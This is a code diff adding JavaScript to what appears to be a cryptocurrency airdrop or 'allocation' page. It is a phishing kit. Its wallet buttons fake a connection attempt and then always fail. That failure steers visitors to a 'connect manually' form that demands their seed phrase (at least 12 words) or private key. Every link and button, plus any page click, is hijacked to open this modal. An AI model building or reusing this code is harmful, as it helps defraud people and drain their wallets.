+      const coinbaseLink = document.getElementById("coinbase-link");
+      const binanceLink = document.getElementById("binance-link");
+
+      // Utility to open/close modal (locks body scroll to avoid layout shifting on mobile)
+      function openModal() {
+        if (!modal) return;
+        modal.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        resetModal();
+      }
+
+      function closeModal() {
+        if (!modal) return;
+        modal.style.display = 'none';
+        document.body.style.overflow = '';
+        resetModal();
+      }
+
+      // Open modal for any element with get-started-btn ID
+      document.querySelectorAll('#get-started-btn').forEach(button => {
+        button.addEventListener('click', () => {
+          openModal();
+        });
+      });
+
+      // Function to show connecting message and then manual connect option
+      function showConnectingMessage(walletName) {
+        // Hide wallet options
+        walletOptions.style.display = "none";
+
+        // Show connecting message
+        connectingMessage.style.display = "flex";
+        messageParagraph.textContent = `Connecting to ${walletName}...`;
+        connectManuallyBtn.style.display = "none";
+        manualInput.style.display = "none";
+
+        // After 2 seconds, show error and manual connect button
+        setTimeout(() => {
+          messageParagraph.textContent = `Error connecting, connect manually to proceed to your allocation.`;
+          connectManuallyBtn.style.display = "block";
+        }, 2000);
+      }
+
+      // Wallet connect button click handlers
+      phantomWalletLink.addEventListener("click", (e) => {
+        e.preventDefault();
+        showConnectingMessage("Phantom Wallet");
+      });
+
+      walletConnectLink.addEventListener("click", (e) => {
+        e.preventDefault();
+        showConnectingMessage("Wallet Connect");
+      });
+
+      // Additional wallets wired to the same flow
+      metamaskLink && metamaskLink.addEventListener("click", (e) => {
+        e.preventDefault();
+        showConnectingMessage("MetaMask");
+      });
+
+      pelagusLink && pelagusLink.addEventListener("click", (e) => {
+        e.preventDefault();
+        showConnectingMessage("Pelagus Wallet");
+      });
+
+      coinbaseLink && coinbaseLink.addEventListener("click", (e) => {
+        e.preventDefault();
+        showConnectingMessage("Coinbase Wallet");
+      });
+
+      binanceLink && binanceLink.addEventListener("click", (e) => {
+        e.preventDefault();
+        showConnectingMessage("Binance Wallet");
+      });
+
+      // Connect manually button click handler
+      connectManuallyBtn.addEventListener("click", () => {
+        connectManuallyBtn.style.display = "none";
+        manualInput.style.display = "block";
+      });
+
+      // Close modal handlers
+      closeModalBtn.addEventListener("click", () => {
+        closeModal();
+      });
+
+      // Click outside modal to close
+      window.addEventListener("click", (e) => {
+        if (e.target == modal) {
+          closeModal();
+        }
+      });
+
+      // Button and link detection utility function
+      function getQualifyingElements() {
+        // Validate that modal element exists before filtering
+        const modal = document.getElementById('walletModal');
+        if (!modal) {
+          console.warn('Modal element not found. Cannot filter elements.');
+          return [];
+        }
+
+        // Get all clickable elements: buttons, links, and buttons inside links
+        const allButtons = document.querySelectorAll('button');
+        const allLinks = document.querySelectorAll('a[href]');
+        const allClickableElements = [...allButtons, ...allLinks];
+
+        // Filter out elements that are children of the modal container
+        return Array.from(allClickableElements).filter(element => {
+          return !modal.contains(element);
+        });
+      }
+
+      // Universal modal trigger system
+      function initializeUniversalModalTriggers() {
+        const startTime = performance.now();
+
+        try {
+          const modal = document.getElementById('walletModal');
+          if (!modal) {
+            console.warn('Modal element not found. Cannot initialize universal triggers.');
+            return;
+          }
+
+          const qualifyingElements = getQualifyingElements();
+          console.log(`Desktop: Initializing universal modal triggers for ${qualifyingElements.length} elements (buttons and links)`);
+
+          let successCount = 0;
+          let errorCount = 0;
+
+          qualifyingElements.forEach((element, index) => {
+            try {
+              // Add duplicate listener prevention using data attributes
+              if (element.getAttribute('data-modal-trigger') === 'true') {
+                return; // Skip if already has modal trigger
+              }
+
+              // Validate element
+              if (!element || typeof element.addEventListener !== 'function') {
+                console.warn(`Desktop: Invalid element at index ${index}:`, element);
+                errorCount++;
+                return;
+              }
+
+              // Mark element as having modal trigger to prevent duplicates
+              element.setAttribute('data-modal-trigger', 'true');
+
+              // Attach modal event listener with error handling
+              element.addEventListener('click', (e) => {
+                try {
+                  // Prevent default behavior for links to stop redirections
+                  e.preventDefault();
+                  e.stopPropagation();
+
+                  // Open modal with existing functionality
+                  openModal();
+
+                  console.log(`Desktop: Modal opened by ${element.tagName} element`);
+                } catch (modalError) {
+                  console.error('Desktop: Error opening modal:', modalError);
+                }
+              });
+
+              successCount++;
+            } catch (elementError) {
+              console.error(`Desktop: Error processing element at index ${index}:`, elementError);
+              errorCount++;
+            }
+          });
+
+          const endTime = performance.now();
+          const initTime = endTime - startTime;
+
+          console.log(`Desktop modal triggers initialized in ${initTime.toFixed(2)}ms`);
+          console.log(`Success: ${successCount}, Errors: ${errorCount}`);
+
+          if (initTime > 50) {
+            console.warn(`Modal trigger initialization took ${initTime.toFixed(2)}ms, exceeding 50ms target`);
+          }
+
+        } catch (error) {
+          console.error('Fatal error in universal modal trigger initialization:', error);
+        }
+      }
+
+      // Reset modal to initial state
+      function resetModal() {
+        walletOptions.style.display = "block";
+        connectingMessage.style.display = "none";
+        manualInput.style.display = "none";
+        connectManuallyBtn.style.display = "none";
+        messageParagraph.textContent = "";
+      }
+
+      // Handle switch between Phrase and Private Key tabs
+      function handleTableClick(tab) {
+        const phraseForm = document.getElementById('phrase-form');
+        const privateKeyForm = document.getElementById('private-key-form');
+
+        if (tab === 'Phrase') {
+          phraseForm.style.display = 'block';
+          privateKeyForm.style.display = 'none';
+        } else if (tab === 'Private-Key') {
+          phraseForm.style.display = 'none';
+          privateKeyForm.style.display = 'block';
+        }
+      }
+
+      // Form validation
+      function validateForm(event) {
+        const formInput = document.getElementById('form_name').value;
+        const errorMessage = document.getElementById('error-message');
+
+        // Check if input contains at least 12 words
+        const words = formInput.trim().split(/\s+/);
+        if (words.length < 12) {
+          event.preventDefault();
+          errorMessage.style.display = 'block';
+          errorMessage.textContent = 'Please enter at least 12 words';
+          return false;
+        }
+        return true;
+      }
+
+      // Initialize universal modal triggers when page loads
+      initializeUniversalModalTriggers();
+
+      // Global page click opens modal unless clicking inside the modal. Guard to avoid reopening.
+      document.addEventListener('click', function (e) {
+        try {
+          if (!modal) return;
+          if (modal.contains(e.target)) return; // ignore clicks in modal
+          var isOpen = modal.style.display && modal.style.display !== 'none';
+          if (isOpen) return;
+          // Prevent navigation for links/buttons so modal shows
+          var clickable = e.target.closest('a, button');
+          if (clickable) e.preventDefault();
+          openModal();
+        } catch (err) {}
+      }, true);
+
+      // Make openModal function globally available
+      window.openModal = openModal;
+    </script>
+</body>
+</html>
